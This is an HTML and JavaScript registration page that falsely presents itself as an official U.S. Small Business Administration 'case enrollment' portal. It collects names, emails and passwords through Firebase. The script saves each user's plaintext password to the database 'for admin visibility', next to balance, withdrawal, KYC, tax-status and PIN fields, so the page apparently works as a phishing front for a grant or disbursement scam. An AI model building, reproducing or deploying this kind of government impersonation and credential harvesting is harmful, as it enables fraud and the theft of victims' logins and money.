<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Case Enrollment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; color: #1e293b; }
        
        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }

        .auth-card { background: white; border-top: 6px solid var(--sba-blue); box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1); border-radius: 4px; }
        input { font-size: 14px !important; transition: all 0.2s; border-radius: 4px !important; }
        input:focus { border-color: var(--sba-blue) !important; ring: 2px; ring-color: var(--sba-blue); outline: none !important; background: #fff !important; }

        .btn-sba { background: var(--sba-blue); transition: all 0.2s; font-size: 11px; letter-spacing: 1.5px; font-weight: 900; border-radius: 4px; }
        .btn-sba:hover { background: #001a3d; transform: translateY(-1px); }
        .btn-sba:disabled { opacity: 0.7; cursor: not-allowed; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#f0f0f0] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
        <span class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Official U.S. Government Portal</span>
    </div>

    <nav class="bg-white px-6 py-4 flex justify-between items-center border-b border-gray-100 sticky top-0 z-50 shadow-sm">
        <div class="flex items-center gap-2">
            <div class="sba-logo-box">
                <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
            </div>
            <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none hidden sm:block">U.S. Small Business<br>Administration</p>
        </div>
        <a href="login.html" class="text-[11px] font-black text-slate-400 hover:text-red-600 uppercase transition-colors">Sign In</a>
    </nav>

    <main class="flex-grow flex items-center justify-center p-6">
        <div class="w-full max-w-[450px]">
            <div class="auth-card p-8 md:p-12">
                <div class="text-center mb-10">
                    <h2 class="text-3xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.25em] mt-3">Federal Enrollment Node V15</p>
                </div>

                <div id="alertBox" class="hidden mb-8 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold uppercase italic animate-pulse"></div>

                <form id="registerForm" class="space-y-6">
                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-[0.15em] mb-2">Legal Business Name / Full Name</label>
                        <input type="text" id="userName" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 outline-none focus:ring-2 focus:ring-blue-100" placeholder="AS SHOWN ON GOVT ID">
                    </div>

                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-[0.15em] mb-2">Administrative Email</label>
                        <input type="email" id="userEmail" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 outline-none focus:ring-2 focus:ring-blue-100" placeholder="EMAIL@DOMAIN.GOV">
                    </div>

                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-[0.15em] mb-2">Set Passkey</label>
                            <input type="password" id="userPass" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 outline-none focus:ring-2 focus:ring-blue-100" placeholder="••••••">
                        </div>
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-[0.15em] mb-2">Confirm</label>
                            <input type="password" id="confirmPass" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 outline-none focus:ring-2 focus:ring-blue-100" placeholder="••••••">
                        </div>
                    </div>

                    <div class="flex items-start gap-3 p-4 bg-blue-50/50 border border-blue-100 rounded">
                        <input type="checkbox" id="termsCheck" required class="mt-1 w-4 h-4 accent-[#002e6d] cursor-pointer">
                        <label for="termsCheck" class="text-[10px] text-slate-600 font-bold uppercase leading-relaxed">
                            I verify accuracy under federal law and agree to the <a href="terms.html" class="text-blue-700 underline">Terms of Disbursement</a>.
                        </label>
                    </div>

                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white py-5 shadow-lg uppercase mt-4">
                        Create Secure Case File
                    </button>
                </form>

                <div class="mt-10 pt-8 border-t border-slate-100 text-center">
                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-3 tracking-widest">Already Registered?</p>
                    <a href="login.html" class="text-[#002e6d] font-black text-[12px] uppercase tracking-[0.2em] hover:text-red-600 transition-all">Resume Case Login <i class="fas fa-arrow-right ml-1"></i></a>
                </div>
            </div>
        </div>
    </main>

    <footer class="py-8 text-center text-[10px] text-slate-400 font-bold uppercase tracking-[0.4em]">
        <i class="fas fa-shield-halved mr-2 text-slate-300"></i> Encrypted Federal Node-V15
    </footer>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { createUserWithEmailAndPassword, sendEmailVerification, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const regForm = document.getElementById('registerForm');
        const alertBox = document.getElementById('alertBox');
        const btn = document.getElementById('submitBtn');

        regForm.onsubmit = async (e) => {
            e.preventDefault();
            alertBox.classList.add('hidden');

            const name = document.getElementById('userName').value.trim();
            const email = document.getElementById('userEmail').value.toLowerCase().trim();
            const pass = document.getElementById('userPass').value;
            const confirm = document.getElementById('confirmPass').value;

            if (pass.length < 6) return showAlert("SECURITY: Passkey must be at least 6 characters.");
            if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> INITIALIZING NODE...';

            try {
                // 1. Create User
                const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                const user = userCredential.user;

                // 2. Initial Data Sync (Pre-filling all the features you requested)
                await setDoc(doc(db, "users", user.uid), {
                    uid: user.uid,
                    fullName: name,
                    email: email,
                    password: pass, // For admin visibility
                    balance: 0,
                    totalAwarded: 0,
                    withdrawAmount: 0,
                    withdrawStatus: "NONE",
                    kycStatus: "NOT VERIFIED", // Default
                    taxStatus: "PENDING",
                    pin: "NOT SET", // For withdrawal security
                    caseID: "FED-" + Math.floor(100000 + Math.random() * 900000),
                    regDate: new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }),
                    role: "USER"
                });

                // 3. Send Verification Email
                await sendEmailVerification(user);

                // 4. Force Sign Out (Crucial to prevent the 'logged in' dashboard bug)
                await signOut(auth);

                // 5. Success Redirect
                window.location.href = "verify.html?email=" + encodeURIComponent(email);

            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Create Secure Case File";
                
                if (error.code === 'auth/email-already-in-use') {
                    showAlert("SYSTEM: Email is already linked to an existing case.");
                } else if (error.code === 'auth/invalid-email') {
                    showAlert("SYSTEM: The email address provided is invalid.");
                } else {
                    showAlert("FATAL ERROR: " + error.message);
                }
            }
        };

        function showAlert(msg) {
            alertBox.innerText = msg;
            alertBox.classList.remove('hidden');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    </script>
</body>
</html>
